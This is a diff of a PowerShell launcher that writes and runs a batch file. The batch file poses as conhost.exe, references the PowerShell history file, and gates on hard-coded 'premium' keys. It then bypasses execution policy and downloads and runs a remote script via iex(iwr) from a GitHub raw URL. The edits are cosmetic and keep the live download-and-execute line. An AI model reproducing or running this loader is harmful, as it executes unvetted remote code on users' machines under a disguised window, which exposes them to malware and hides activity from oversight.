@@ -2,9 +2,9 @@ $path = "$env:TEMP\run.bat"
 
 @"
 @echo off
-mode con: cols=60 lines=20
+mode con: cols=50 lines=15
 title C:\Windows\System32\conhost.exe
-color 0A
+color 07
 cls
 
 set hist=%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -18,7 +18,6 @@ set key=%key: =%
 
 if "%key%"=="Nel" goto ok
 if "%key%"=="King" goto ok
-
 if "%key%"=="finalpremium-27BHJ" goto ok
 if "%key%"=="finalpremium-8K2LM" goto ok
 if "%key%"=="finalpremium-X91QP" goto ok
@@ -35,10 +34,12 @@ goto input
 
 :ok
 powershell -ExecutionPolicy Bypass -Command "iex (iwr 'https://raw.githubusercontent.com/lnwmon2-crypto/private/main/main.ps1')"
-echo.
+cls
 echo Successfully
-pause
+
+:: ล็อคไม่ให้พิมพ์ต่อ
+pause >nul
 "@ | Out-File -Encoding ASCII $path
 
-cmd.exe /c start cmd /k "$path"
+cmd.exe /c start "" cmd /k "$path"
 exit
